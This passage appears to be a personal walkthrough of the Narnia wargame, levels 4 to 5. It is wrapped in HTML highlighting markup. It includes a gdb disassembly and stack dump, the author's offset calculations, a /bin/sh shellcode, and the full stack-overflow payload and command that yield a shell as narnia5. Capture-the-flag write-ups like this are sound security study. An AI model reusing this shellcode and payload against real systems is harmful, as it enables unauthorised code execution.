   <span class="mh">0x08048444</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span> <span class="nx">push</span>   <span class="nx">ebp</span>
   <span class="mh">0x08048445</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span> <span class="nx">mov</span>    <span class="nx">ebp</span><span class="p">,</span><span class="nx">esp</span>
   <span class="mh">0x08048447</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span> <span class="nx">push</span>   <span class="nx">edi</span>
   <span class="mh">0x08048448</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;:</span> <span class="nx">and</span>    <span class="nx">esp</span><span class="p">,</span><span class="mh">0xfffffff0</span>
   <span class="mh">0x0804844b</span> <span class="o">&lt;+</span><span class="mi">7</span><span class="o">&gt;:</span> <span class="nx">sub</span>    <span class="nx">esp</span><span class="p">,</span><span class="mh">0x130</span>
   <span class="mh">0x08048451</span> <span class="o">&lt;+</span><span class="mi">13</span><span class="o">&gt;:</span>  <span class="nx">mov</span>    <span class="nx">DWORD</span> <span class="nx">PTR</span> <span class="cp">[</span><span class="nx">esp</span><span class="o">+</span><span class="mh">0x12c</span><span class="cp">]</span><span class="p">,</span><span class="mh">0x0</span>
   <span class="mh">0x0804845c</span> <span class="o">&lt;+</span><span class="mi">24</span><span class="o">&gt;:</span>  <span class="nx">jmp</span>    <span class="mh">0x80484c0</span> <span class="o">&lt;</span><span class="nx">main</span><span class="o">+</span><span class="mi">124</span><span class="o">&gt;</span>
   <span class="mh">0x0804845e</span> <span class="o">&lt;+</span><span class="mi">26</span><span class="o">&gt;:</span>  <span class="nx">mov</span>    <span class="nx">eax</span><span class="p">,</span><span class="nx">ds</span><span class="o">:</span><span class="mh">0x80497d0</span>
   <span class="mh">0x08048463</span> <span class="o">&lt;+</span><span class="mi">31</span><span class="o">&gt;:</span>  <span class="nx">mov</span>    <span class="nx">edx</span><span class="p">,</span><span class="nx">DWORD</span> <span class="nx">PTR</span> <span class="cp">[</span><span class="nx">esp</span><span class="o">+</span><span class="mh">0x12c</span><span class="cp">]</span>
   <span class="mh">0x0804846a</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;:</span>  <span class="nx">shl</span>    <span class="nx">edx</span><span class="p">,</span><span class="mh">0x2</span>
   <span class="mh">0x0804846d</span> <span class="o">&lt;+</span><span class="mi">41</span><span class="o">&gt;:</span>  <span class="nx">add</span>    <span class="nx">eax</span><span class="p">,</span><span class="nx">edx</span>
   <span class="mh">0x0804846f</span> <span class="o">&lt;+</span><span class="mi">43</span><span class="o">&gt;:</span>  <span class="nx">mov</span>    <span class="nx">eax</span><span class="p">,</span><span class="nx">DWORD</span> <span class="nx">PTR</span> <span class="cp">[</span><span class="nx">eax</span><span class="cp">]</span>
   <span class="mh">0x08048471</span> <span class="o">&lt;+</span><span class="mi">45</span><span class="o">&gt;:</span>  <span class="nx">mov</span>    <span class="nx">DWORD</span> <span class="nx">PTR</span> <span class="cp">[</span><span class="nx">esp</span><span class="o">+</span><span class="mh">0x1c</span><span class="cp">]</span><span class="p">,</span><span class="mh">0xffffffff</span>
   <span class="mh">0x08048479</span> <span class="o">&lt;+</span><span class="mi">53</span><span class="o">&gt;:</span>  <span class="nx">mov</span>    <span class="nx">edx</span><span class="p">,</span><span class="nx">eax</span>
   <span class="mh">0x0804847b</span> <span class="o">&lt;+</span><span class="mi">55</span><span class="o">&gt;:</span>  <span class="nx">mov</span>    <span class="nx">eax</span><span class="p">,</span><span class="mh">0x0</span>
   <span class="mh">0x08048480</span> <span class="o">&lt;+</span><span class="mi">60</span><span class="o">&gt;:</span>  <span class="nx">mov</span>    <span class="nx">ecx</span><span class="p">,</span><span class="nx">DWORD</span> <span class="nx">PTR</span> <span class="cp">[</span><span class="nx">esp</span><span class="o">+</span><span class="mh">0x1c</span><span class="cp">]</span>
   <span class="mh">0x08048484</span> <span class="o">&lt;+</span><span class="mi">64</span><span class="o">&gt;:</span>  <span class="nx">mov</span>    <span class="nx">edi</span><span class="p">,</span><span class="nx">edx</span>
   <span class="mh">0x08048486</span> <span class="o">&lt;+</span><span class="mi">66</span><span class="o">&gt;:</span>  <span class="nx">repnz</span> <span class="nx">scas</span> <span class="nx">al</span><span class="p">,</span><span class="nx">BYTE</span> <span class="nx">PTR</span> <span class="nx">es</span><span class="o">:</span><span class="cp">[</span><span class="nx">edi</span><span class="cp">]</span>
   <span class="mh">0x08048488</span> <span class="o">&lt;+</span><span class="mi">68</span><span class="o">&gt;:</span>  <span class="nx">mov</span>    <span class="nx">eax</span><span class="p">,</span><span class="nx">ecx</span>
   <span class="mh">0x0804848a</span> <span class="o">&lt;+</span><span class="mi">70</span><span class="o">&gt;:</span>  <span class="nx">not</span>    <span class="nx">eax</span>
   <span class="mh">0x0804848c</span> <span class="o">&lt;+</span><span class="mi">72</span><span class="o">&gt;:</span>  <span class="nx">lea</span>    <span class="nx">ecx</span><span class="p">,</span><span class="cp">[</span><span class="nx">eax</span><span class="o">-</span><span class="mh">0x1</span><span class="cp">]</span>
   <span class="mh">0x0804848f</span> <span class="o">&lt;+</span><span class="mi">75</span><span class="o">&gt;:</span>  <span class="nx">mov</span>    <span class="nx">eax</span><span class="p">,</span><span class="nx">ds</span><span class="o">:</span><span class="mh">0x80497d0</span>
   <span class="mh">0x08048494</span> <span class="o">&lt;+</span><span class="mi">80</span><span class="o">&gt;:</span>  <span class="nx">mov</span>    <span class="nx">edx</span><span class="p">,</span><span class="nx">DWORD</span> <span class="nx">PTR</span> <span class="cp">[</span><span class="nx">esp</span><span class="o">+</span><span class="mh">0x12c</span><span class="cp">]</span>
   <span class="mh">0x0804849b</span> <span class="o">&lt;+</span><span class="mi">87</span><span class="o">&gt;:</span>  <span class="nx">shl</span>    <span class="nx">edx</span><span class="p">,</span><span class="mh">0x2</span>
   <span class="mh">0x0804849e</span> <span class="o">&lt;+</span><span class="mi">90</span><span class="o">&gt;:</span>  <span class="nx">add</span>    <span class="nx">eax</span><span class="p">,</span><span class="nx">edx</span>
   <span class="mh">0x080484a0</span> <span class="o">&lt;+</span><span class="mi">92</span><span class="o">&gt;:</span>  <span class="nx">mov</span>    <span class="nx">eax</span><span class="p">,</span><span class="nx">DWORD</span> <span class="nx">PTR</span> <span class="cp">[</span><span class="nx">eax</span><span class="cp">]</span>
   <span class="mh">0x080484a2</span> <span class="o">&lt;+</span><span class="mi">94</span><span class="o">&gt;:</span>  <span class="nx">mov</span>    <span class="nx">edx</span><span class="p">,</span><span class="nx">ecx</span>
   <span class="mh">0x080484a4</span> <span class="o">&lt;+</span><span class="mi">96</span><span class="o">&gt;:</span>  <span class="nx">mov</span>    <span class="nx">DWORD</span> <span class="nx">PTR</span> <span class="cp">[</span><span class="nx">esp</span><span class="o">+</span><span class="mh">0x8</span><span class="cp">]</span><span class="p">,</span><span class="nx">edx</span>
   <span class="mh">0x080484a8</span> <span class="o">&lt;+</span><span class="mi">100</span><span class="o">&gt;:</span> <span class="nx">mov</span>    <span class="nx">DWORD</span> <span class="nx">PTR</span> <span class="cp">[</span><span class="nx">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="cp">]</span><span class="p">,</span><span class="mh">0x0</span>
   <span class="mh">0x080484b0</span> <span class="o">&lt;+</span><span class="mi">108</span><span class="o">&gt;:</span> <span class="nx">mov</span>    <span class="nx">DWORD</span> <span class="nx">PTR</span> <span class="cp">[</span><span class="nx">esp</span><span class="cp">]</span><span class="p">,</span><span class="nx">eax</span>
   <span class="mh">0x080484b3</span> <span class="o">&lt;+</span><span class="mi">111</span><span class="o">&gt;:</span> <span class="nx">call</span>   <span class="mh">0x8048380</span> <span class="o">&lt;</span><span class="nx">memset</span><span class="err">@</span><span class="nx">plt</span><span class="o">&gt;</span>
   <span class="mh">0x080484b8</span> <span class="o">&lt;+</span><span class="mi">116</span><span class="o">&gt;:</span> <span class="nx">add</span>    <span class="nx">DWORD</span> <span class="nx">PTR</span> <span class="cp">[</span><span class="nx">esp</span><span class="o">+</span><span class="mh">0x12c</span><span class="cp">]</span><span class="p">,</span><span class="mh">0x1</span>
   <span class="mh">0x080484c0</span> <span class="o">&lt;+</span><span class="mi">124</span><span class="o">&gt;:</span> <span class="nx">mov</span>    <span class="nx">eax</span><span class="p">,</span><span class="nx">ds</span><span class="o">:</span><span class="mh">0x80497d0</span>
   <span class="mh">0x080484c5</span> <span class="o">&lt;+</span><span class="mi">129</span><span class="o">&gt;:</span> <span class="nx">mov</span>    <span class="nx">edx</span><span class="p">,</span><span class="nx">DWORD</span> <span class="nx">PTR</span> <span class="cp">[</span><span class="nx">esp</span><span class="o">+</span><span class="mh">0x12c</span><span class="cp">]</span>
   <span class="mh">0x080484cc</span> <span class="o">&lt;+</span><span class="mi">136</span><span class="o">&gt;:</span> <span class="nx">shl</span>    <span class="nx">edx</span><span class="p">,</span><span class="mh">0x2</span>
   <span class="mh">0x080484cf</span> <span class="o">&lt;+</span><span class="mi">139</span><span class="o">&gt;:</span> <span class="nx">add</span>    <span class="nx">eax</span><span class="p">,</span><span class="nx">edx</span>
   <span class="mh">0x080484d1</span> <span class="o">&lt;+</span><span class="mi">141</span><span class="o">&gt;:</span> <span class="nx">mov</span>    <span class="nx">eax</span><span class="p">,</span><span class="nx">DWORD</span> <span class="nx">PTR</span> <span class="cp">[</span><span class="nx">eax</span><span class="cp">]</span>
   <span class="mh">0x080484d3</span> <span class="o">&lt;+</span><span class="mi">143</span><span class="o">&gt;:</span> <span class="nx">test</span>   <span class="nx">eax</span><span class="p">,</span><span class="nx">eax</span>
   <span class="mh">0x080484d5</span> <span class="o">&lt;+</span><span class="mi">145</span><span class="o">&gt;:</span> <span class="nx">jne</span>    <span class="mh">0x804845e</span> <span class="o">&lt;</span><span class="nx">main</span><span class="o">+</span><span class="mi">26</span><span class="o">&gt;</span>
   <span class="mh">0x080484d7</span> <span class="o">&lt;+</span><span class="mi">147</span><span class="o">&gt;:</span> <span class="nx">cmp</span>    <span class="nx">DWORD</span> <span class="nx">PTR</span> <span class="cp">[</span><span class="nx">ebp</span><span class="o">+</span><span class="mh">0x8</span><span class="cp">]</span><span class="p">,</span><span class="mh">0x1</span>
   <span class="mh">0x080484db</span> <span class="o">&lt;+</span><span class="mi">151</span><span class="o">&gt;:</span> <span class="nx">jle</span>    <span class="mh">0x80484f5</span> <span class="o">&lt;</span><span class="nx">main</span><span class="o">+</span><span class="mi">177</span><span class="o">&gt;</span>
   <span class="mh">0x080484dd</span> <span class="o">&lt;+</span><span class="mi">153</span><span class="o">&gt;:</span> <span class="nx">mov</span>    <span class="nx">eax</span><span class="p">,</span><span class="nx">DWORD</span> <span class="nx">PTR</span> <span class="cp">[</span><span class="nx">ebp</span><span class="o">+</span><span class="mh">0xc</span><span class="cp">]</span>
   <span class="mh">0x080484e0</span> <span class="o">&lt;+</span><span class="mi">156</span><span class="o">&gt;:</span> <span class="nx">add</span>    <span class="nx">eax</span><span class="p">,</span><span class="mh">0x4</span>
   <span class="mh">0x080484e3</span> <span class="o">&lt;+</span><span class="mi">159</span><span class="o">&gt;:</span> <span class="nx">mov</span>    <span class="nx">eax</span><span class="p">,</span><span class="nx">DWORD</span> <span class="nx">PTR</span> <span class="cp">[</span><span class="nx">eax</span><span class="cp">]</span>
   <span class="mh">0x080484e5</span> <span class="o">&lt;+</span><span class="mi">161</span><span class="o">&gt;:</span> <span class="nx">mov</span>    <span class="nx">DWORD</span> <span class="nx">PTR</span> <span class="cp">[</span><span class="nx">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="cp">]</span><span class="p">,</span><span class="nx">eax</span>
   <span class="mh">0x080484e9</span> <span class="o">&lt;+</span><span class="mi">165</span><span class="o">&gt;:</span> <span class="nx">lea</span>    <span class="nx">eax</span><span class="p">,</span><span class="cp">[</span><span class="nx">esp</span><span class="o">+</span><span class="mh">0x2c</span><span class="cp">]</span>
   <span class="mh">0x080484ed</span> <span class="o">&lt;+</span><span class="mi">169</span><span class="o">&gt;:</span> <span class="nx">mov</span>    <span class="nx">DWORD</span> <span class="nx">PTR</span> <span class="cp">[</span><span class="nx">esp</span><span class="cp">]</span><span class="p">,</span><span class="nx">eax</span>
   <span class="mh">0x080484f0</span> <span class="o">&lt;+</span><span class="mi">172</span><span class="o">&gt;:</span> <span class="nx">call</span>   <span class="mh">0x8048350</span> <span class="o">&lt;</span><span class="nx">strcpy</span><span class="err">@</span><span class="nx">plt</span><span class="o">&gt;</span>
   <span class="mh">0x080484f5</span> <span class="o">&lt;+</span><span class="mi">177</span><span class="o">&gt;:</span> <span class="nx">mov</span>    <span class="nx">eax</span><span class="p">,</span><span class="mh">0x0</span>
   <span class="mh">0x080484fa</span> <span class="o">&lt;+</span><span class="mi">182</span><span class="o">&gt;:</span> <span class="nx">mov</span>    <span class="nx">edi</span><span class="p">,</span><span class="nx">DWORD</span> <span class="nx">PTR</span> <span class="cp">[</span><span class="nx">ebp</span><span class="o">-</span><span class="mh">0x4</span><span class="cp">]</span>
   <span class="mh">0x080484fd</span> <span class="o">&lt;+</span><span class="mi">185</span><span class="o">&gt;:</span> <span class="nx">leave</span>
   <span class="mh">0x080484fe</span> <span class="o">&lt;+</span><span class="mi">186</span><span class="o">&gt;:</span> <span class="nx">ret</span>
<span class="nx">End</span> <span class="nx">of</span> <span class="nx">assembler</span> <span class="nx">dump</span><span class="p">.</span>
<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">b</span> <span class="o">*</span><span class="nx">main</span><span class="o">+</span><span class="mi">182</span>
<span class="nx">Breakpoint</span> <span class="mi">1</span> <span class="nx">at</span> <span class="mh">0x80484fa</span>
<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">r</span>
<span class="nx">Starting</span> <span class="nx">program</span><span class="o">:</span> <span class="err">/games/narnia/narnia4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>

<span class="nx">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x080484fa</span> <span class="k">in</span> <span class="nx">main</span> <span class="p">()</span>
<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">x</span><span class="o">/</span><span class="mi">100</span><span class="nx">xw</span> <span class="nx">$esp</span>
<span class="mh">0xffffd490</span><span class="o">:</span> <span class="mh">0xffffd4bc</span>  <span class="mh">0xffffd7ae</span>  <span class="mh">0x00000021</span>  <span class="mh">0xf7ff7d54</span>
<span class="mh">0xffffd4a0</span><span class="o">:</span> <span class="mh">0xf7e2ae38</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000026</span>  <span class="mh">0xffffffff</span>
<span class="mh">0xffffd4b0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000001</span>  <span class="mh">0x41414141</span>
<span class="mh">0xffffd4c0</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
<span class="mh">0xffffd4d0</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
<span class="mh">0xffffd4e0</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
<span class="mh">0xffffd4f0</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
<span class="mh">0xffffd500</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
<span class="mh">0xffffd510</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
<span class="mh">0xffffd520</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
<span class="mh">0xffffd530</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
<span class="mh">0xffffd540</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
<span class="mh">0xffffd550</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
<span class="mh">0xffffd560</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
<span class="mh">0xffffd570</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
<span class="mh">0xffffd580</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
<span class="mh">0xffffd590</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
<span class="mh">0xffffd5a0</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
<span class="mh">0xffffd5b0</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
<span class="mh">0xffffd5c0</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0xf7e40400</span>
<span class="mh">0xffffd5d0</span><span class="o">:</span> <span class="mh">0x00000002</span>  <span class="mh">0xffffd664</span>  <span class="mh">0xffffd670</span>  <span class="mh">0xf7fcf000</span>
<span class="mh">0xffffd5e0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0xffffd61c</span>  <span class="mh">0xffffd670</span>  <span class="mh">0x00000000</span>
<span class="mh">0xffffd5f0</span><span class="o">:</span> <span class="mh">0x0804824c</span>  <span class="mh">0xf7fcaff4</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
<span class="mh">0xffffd600</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0xf15ec5e3</span>  <span class="mh">0xc6fd81f3</span>  <span class="mh">0x00000000</span>
<span class="mh">0xffffd610</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000002</span>  <span class="mh">0x08048390</span>
<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">i</span> <span class="nx">f</span>
<span class="nx">Stack</span> <span class="nx">level</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">frame</span> <span class="nx">at</span> <span class="mh">0xffffd5d0</span><span class="o">:</span>
 <span class="nx">eip</span> <span class="o">=</span> <span class="mh">0x80484fa</span> <span class="k">in</span> <span class="nx">main</span><span class="p">;</span> <span class="nx">saved</span> <span class="nx">eip</span> <span class="mh">0xf7e40400</span>
 <span class="nx">Arglist</span> <span class="nx">at</span> <span class="mh">0xffffd5c8</span><span class="p">,</span> <span class="nx">args</span><span class="o">:</span>
 <span class="nx">Locals</span> <span class="nx">at</span> <span class="mh">0xffffd5c8</span><span class="p">,</span> <span class="nx">Previous</span> <span class="nx">frame</span><span class="s1">&#39;s sp is 0xffffd5d0</span>
<span class="s1"> Saved registers:</span>
<span class="s1">  ebp at 0xffffd5c8, edi at 0xffffd5c4, eip at 0xffffd5cc</span>

<span class="s1">So we see that the return adress is at 0xffffd5cc</span>

<span class="s1">since we need to fill the stack with junk bytes + shellcode until overwriting the</span>
<span class="s1">return address, we use nop sled</span>

<span class="s1">http://en.wikipedia.org/wiki/NOP</span>

<span class="s1">anywayre in nops</span>
<span class="s1">so lets us make 150-300 nops</span>

<span class="s1">0xd5cc - 134 =0xd546  --&gt; go to 142 position, so nops from to 142 will point to the code</span>

<span class="s1">------</span>

<span class="s1">272 is the size of the stack</span>
<span class="s1">276 should be the return adress --&gt; we want to rewrite this with the address where we have a shellcode</span>
<span class="s1">25 bytes is our shell code</span>
<span class="s1">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80</span>

<span class="s1">----</span>
<span class="s1">nop 142 -200 - 227</span>
<span class="s1">shellcode 25</span>
<span class="s1">A -  105   - 47 - - 20</span>

<span class="s1">272!!!</span>


<span class="s1">address = 4</span>
<span class="s1">total: 276 bytes</span>

<span class="s1">shellcode = (&#39;</span><span class="err">\</span><span class="nx">x90</span><span class="s1">&#39;*142 + &#39;</span><span class="err">\</span><span class="nx">x31</span><span class="err">\</span><span class="nx">xc0</span><span class="err">\</span><span class="nx">x50</span><span class="err">\</span><span class="nx">x68</span><span class="err">\</span><span class="nx">x2f</span><span class="err">\</span><span class="nx">x2f</span><span class="err">\</span><span class="nx">x73</span><span class="err">\</span><span class="nx">x68</span><span class="err">\</span><span class="nx">x68</span><span class="err">\</span><span class="nx">x2f</span><span class="err">\</span><span class="nx">x62</span><span class="err">\</span><span class="nx">x69</span><span class="err">\</span><span class="nx">x6e</span><span class="err">\</span><span class="nx">x89</span><span class="err">\</span><span class="nx">xe3</span><span class="err">\</span><span class="nx">x50</span><span class="err">\</span><span class="nx">x89</span><span class="err">\</span><span class="nx">xe2</span><span class="err">\</span><span class="nx">x50</span><span class="err">\</span><span class="nx">x89</span><span class="err">\</span><span class="nx">xe1</span><span class="err">\</span><span class="nx">xb0</span><span class="err">\</span><span class="nx">x0b</span><span class="err">\</span><span class="nx">xcd</span><span class="err">\</span><span class="nx">x80</span><span class="s1">&#39; + &#39;</span><span class="nx">A</span><span class="s1">&#39;*105 + &#39;</span><span class="err">\</span><span class="nx">x46</span><span class="err">\</span><span class="nx">xd5</span><span class="err">\</span><span class="nx">xff</span><span class="err">\</span><span class="nx">xff</span><span class="s1">&#39;)</span>
<span class="s1">print shellcode</span>




<span class="s1">0xd5cc - 120 = D554</span>
<span class="s1">276-120 = 156 --&gt; go to the 156 positon so nops from 156 works</span>
<span class="s1">shellcode = (&#39;</span><span class="err">\</span><span class="nx">x90</span><span class="s1">&#39;*156 + &#39;</span><span class="err">\</span><span class="nx">x31</span><span class="err">\</span><span class="nx">xc0</span><span class="err">\</span><span class="nx">x50</span><span class="err">\</span><span class="nx">x68</span><span class="err">\</span><span class="nx">x2f</span><span class="err">\</span><span class="nx">x2f</span><span class="err">\</span><span class="nx">x73</span><span class="err">\</span><span class="nx">x68</span><span class="err">\</span><span class="nx">x68</span><span class="err">\</span><span class="nx">x2f</span><span class="err">\</span><span class="nx">x62</span><span class="err">\</span><span class="nx">x69</span><span class="err">\</span><span class="nx">x6e</span><span class="err">\</span><span class="nx">x89</span><span class="err">\</span><span class="nx">xe3</span><span class="err">\</span><span class="nx">x50</span><span class="err">\</span><span class="nx">x89</span><span class="err">\</span><span class="nx">xe2</span><span class="err">\</span><span class="nx">x50</span><span class="err">\</span><span class="nx">x89</span><span class="err">\</span><span class="nx">xe1</span><span class="err">\</span><span class="nx">xb0</span><span class="err">\</span><span class="nx">x0b</span><span class="err">\</span><span class="nx">xcd</span><span class="err">\</span><span class="nx">x80</span><span class="s1">&#39; + &#39;</span><span class="nx">A</span><span class="s1">&#39;*91 + &#39;</span><span class="err">\</span><span class="nx">x54</span><span class="err">\</span><span class="nx">xd5</span><span class="err">\</span><span class="nx">xff</span><span class="err">\</span><span class="nx">xff</span><span class="s1">&#39;)</span>
<span class="s1">print shellcode</span>


<span class="s1">narnia4@melinda:/tmp/yay$ python -c &quot;print &#39;</span><span class="err">\</span><span class="nx">x90</span><span class="s1">&#39;*156 + &#39;</span><span class="err">\</span><span class="nx">x31</span><span class="err">\</span><span class="nx">xc0</span><span class="err">\</span><span class="nx">x50</span><span class="err">\</span><span class="nx">x68</span><span class="err">\</span><span class="nx">x2f</span><span class="err">\</span><span class="nx">x2f</span><span class="err">\</span><span class="nx">x73</span><span class="err">\</span><span class="nx">x68</span><span class="err">\</span><span class="nx">x68</span><span class="err">\</span><span class="nx">x2f</span><span class="err">\</span><span class="nx">x62</span><span class="err">\</span><span class="nx">x69</span><span class="err">\</span><span class="nx">x6e</span><span class="err">\</span><span class="nx">x89</span><span class="err">\</span><span class="nx">xe3</span><span class="err">\</span><span class="nx">x50</span><span class="err">\</span><span class="nx">x89</span><span class="err">\</span><span class="nx">xe2</span><span class="err">\</span><span class="nx">x50</span><span class="err">\</span><span class="nx">x89</span><span class="err">\</span><span class="nx">xe1</span><span class="err">\</span><span class="nx">xb0</span><span class="err">\</span><span class="nx">x0b</span><span class="err">\</span><span class="nx">xcd</span><span class="err">\</span><span class="nx">x80</span><span class="s1">&#39; + &#39;</span><span class="nx">A</span><span class="s1">&#39;*91 + &#39;</span><span class="err">\</span><span class="nx">x54</span><span class="err">\</span><span class="nx">xd5</span><span class="err">\</span><span class="nx">xff</span><span class="err">\</span><span class="nx">xff</span><span class="s1">&#39;&quot;</span>
<span class="s1">������������������������������������������������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin��P��P���</span>
<span class="s1">              AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT���</span>
<span class="s1">narnia4@melinda:/tmp/yay$ /narnia/narnia4 `python -c &quot;print &#39;</span><span class="err">\</span><span class="nx">x90</span><span class="s1">&#39;*156 + &#39;</span><span class="err">\</span><span class="nx">x31</span><span class="err">\</span><span class="nx">xc0</span><span class="err">\</span><span class="nx">x50</span><span class="err">\</span><span class="nx">x68</span><span class="err">\</span><span class="nx">x2f</span><span class="err">\</span><span class="nx">x2f</span><span class="err">\</span><span class="nx">x73</span><span class="err">\</span><span class="nx">x68</span><span class="err">\</span><span class="nx">x68</span><span class="err">\</span><span class="nx">x2f</span><span class="err">\</span><span class="nx">x62</span><span class="err">\</span><span class="nx">x69</span><span class="err">\</span><span class="nx">x6e</span><span class="err">\</span><span class="nx">x89</span><span class="err">\</span><span class="nx">xe3</span><span class="err">\</span><span class="nx">x50</span><span class="err">\</span><span class="nx">x89</span><span class="err">\</span><span class="nx">xe2</span><span class="err">\</span><span class="nx">x50</span><span class="err">\</span><span class="nx">x89</span><span class="err">\</span><span class="nx">xe1</span><span class="err">\</span><span class="nx">xb0</span><span class="err">\</span><span class="nx">x0b</span><span class="err">\</span><span class="nx">xcd</span><span class="err">\</span><span class="nx">x80</span><span class="s1">&#39; + &#39;</span><span class="nx">A</span><span class="s1">&#39;*91 + &#39;</span><span class="err">\</span><span class="nx">x54</span><span class="err">\</span><span class="nx">xd5</span><span class="err">\</span><span class="nx">xff</span><span class="err">\</span><span class="nx">xff</span><span class="err">&#39;&quot;`</span>
<span class="nx">$</span> <span class="nx">whoami</span>
<span class="nx">narnia5</span>




<span class="o">----------</span>

<span class="nx">Level</span> <span class="mi">5</span>
</pre></div>


<p>narnia5@melinda:/narnia$ ./narnia5
Change i's value from 1 -&gt; 500. No way...let me give you a hint!
buffer : [] (0)
i = 1 (0xffffd6fc)
narnia5@melinda:/narnia$ cat narnia5.c
/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.</p>
<div class="highlight"><pre><span class="n">This</span> <span class="n">program</span> <span class="n">is</span> <span class="n">distributed</span> <span class="n">in</span> <span class="n">the</span> <span class="n">hope</span> <span class="n">that</span> <span class="n">it</span> <span class="n">will</span> <span class="n">be</span> <span class="n">useful</span><span class="p">,</span>
<span class="n">but</span> <span class="n">WITHOUT</span> <span class="n">ANY</span> <span class="n">WARRANTY</span><span class="p">;</span> <span class="n">without</span> <span class="n">even</span> <span class="n">the</span> <span class="n">implied</span> <span class="n">warranty</span> <span class="n">of</span>
<span class="n">MERCHANTABILITY</span> <span class="n">or</span> <span class="n">FITNESS</span> <span class="n">FOR</span> <span class="n">A</span> <span class="n">PARTICULAR</span> <span class="n">PURPOSE</span><span class="p">.</span>  <span class="n">See</span> <span class="n">the</span>
<span class="n">GNU</span> <span class="n">General</span> <span class="n">Public</span> <span class="n">License</span> <span class="k">for</span> <span class="n">more</span> <span class="n">details</span><span class="p">.</span>

<span class="n">You</span> <span class="n">should</span> <span class="n">have</span> <span class="n">received</span> <span class="n">a</span> <span class="n">copy</span> <span class="n">of</span> <span class="n">the</span> <span class="n">GNU</span> <span class="n">General</span> <span class="n">Public</span> <span class="n">License</span>
<span class="n">along</span> <span class="n">with</span> <span class="n">this</span> <span class="n">program</span><span class="p">;</span> <span class="k">if</span> <span class="n">not</span><span class="p">,</span> <span class="n">write</span> <span class="n">to</span> <span class="n">the</span> <span class="n">Free</span> <span class="n">Software</span>
